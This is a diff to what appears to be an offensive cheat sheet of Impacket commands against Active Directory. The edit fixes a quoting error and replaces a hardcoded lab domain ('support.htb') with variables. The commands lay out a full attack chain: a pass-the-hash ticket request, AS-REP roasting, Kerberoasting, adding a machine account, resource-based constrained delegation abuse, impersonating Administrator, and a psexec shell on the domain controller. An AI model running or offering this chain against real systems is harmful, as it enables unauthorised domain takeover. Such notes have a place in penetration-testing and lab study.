@@ -533,7 +533,7 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD
 
 +---------- Use .ccache ----------+
 export KRB5CCNAME=`pwd`/Guest.ccache; chmod 0600 $KRB5CCNAME
-export KRB5CCNAME=`pwd`/$USERNAME.ccache"; chmod 0600 $KRB5CCNAME
+export KRB5CCNAME=`pwd`/$USERNAME.ccache; chmod 0600 $KRB5CCNAME
 
 +---------- Kerberos .ccache Negotiation ----------+
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
@@ -543,7 +543,7 @@ impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile use
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
-impacket-rbcd -dc-ip $TARGET support.htb/mypc$:'123qweasdF!' -action write -delegate-from mypc$ -delegate-to DC$
+impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
 impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME=`pwd`/mypc$.ccache
 impacket-getST -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -u2u -impersonate "Administrator" -spn "host/$DC" 2>/dev/null
 impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
